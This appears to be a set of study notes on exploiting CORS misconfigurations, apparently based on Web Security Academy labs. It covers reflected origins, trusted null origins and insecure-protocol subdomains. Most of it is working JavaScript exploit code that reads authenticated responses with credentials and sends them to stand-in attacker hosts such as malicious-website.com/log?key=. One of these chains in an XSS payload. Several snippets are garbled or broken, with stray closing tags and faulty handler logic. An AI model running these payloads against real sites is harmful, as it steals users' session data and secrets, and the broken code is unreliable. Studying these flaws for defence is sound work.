# Cross-origin resource sharing (CORS)

## Description

This vulnerability can be detect reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
It then responds with:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```
These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session.

Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

### CORS vulnerability with basic origin reflection

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
```

In case of a CORS, in this case when there is an API call retriving some data, such as api key)
You can use this exploit
It's usefull to have a look sometime into the http history

### CORS vulnerability with trusted null origin

```
Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.
In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with the URL for your unique lab URL and YOUR-EXPLOIT-SERVER-ID with the exploit server ID:

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
### CORS vulnerability with trusted insecure protocols

```

Origin: http://stock.0adf00f9038f231ec0768bf6000b00b0.web-security-academy.net/
Access-Control-Allow-Origin: http://stock.0adf00f9038f231ec0768bf6000b00b0.web-security-academy.net/
Access-Control-Allow-Credentials: true

Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain.
Observe that the productID parameter is vulnerable to XSS.
In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID:

<script>
    document.location="http://stock.YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```


function reqListener() {
location='malicious-website.com/log?key='+this.responseText; //or +encodeURIComponent(this.responseText);
};
</script>"></iframe>
```


Useful Javascript:

Date.now() -> 1664702791175
--------------------------------
var req = new XMLHttpRequest();
req.onload = handleResponse();
req.open('get','http://127.0.0.1:8000/test.html',true);
req.send();
    function handleResponse() { console.log()
    var token = this.responseText.match(/unixtimestamp.[0-9]*/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.onload = handleResponse2();
    changeReq.open('get', '/'+token, true);
    changeReq.withCredentials = true;
    changeReq.send()
  function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };
  }
    //or +encodeURIComponent(this.responseText);
    
 https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials
## URL
https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials
